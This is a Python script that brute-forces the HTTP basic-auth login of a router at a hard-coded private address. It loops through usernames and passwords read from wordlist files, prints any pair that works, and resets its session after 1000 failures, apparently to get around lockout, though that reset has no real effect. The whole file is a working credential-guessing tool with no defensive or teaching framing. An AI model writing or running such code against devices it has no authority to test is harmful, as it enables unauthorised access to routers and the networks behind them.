import requests

def read_items_from_file(file_name):
    with open(file_name, 'r') as file:
        items = [line.strip() for line in file]
    return items

def login(router_ip, username, password):
    url = f"http://{router_ip}/"
    try:
        response = requests.get(url, auth=(username, password))
        if response.status_code == 200:
            return True
    except requests.RequestException as e:
        pass
    return False

def main():
    router_ip = "192.168.13.11"  
    usernames = read_items_from_file('usernames.txt')
    passwords = read_items_from_file('pass.txt') 
    max_attempts = 1000  
    unsuccessful_attempts = 0  
    session = requests.Session()  
    for username in usernames:
        print(f"Trying username: {username}")
        for password in passwords:
            print(f"Trying password: {password}")
            if login(router_ip, username, password):
                print("Logging Successful")
                print(f"Username: {username}\nPassword: {password}")
                return  
            unsuccessful_attempts += 1
            if unsuccessful_attempts >= max_attempts:
                print(f"Max unsuccessful attempts ({max_attempts}) reached. Refreshing session.")
                unsuccessful_attempts = 0  
                session = requests.Session()  
    print("Logging Failed")

if __name__ == "__main__":
    main()
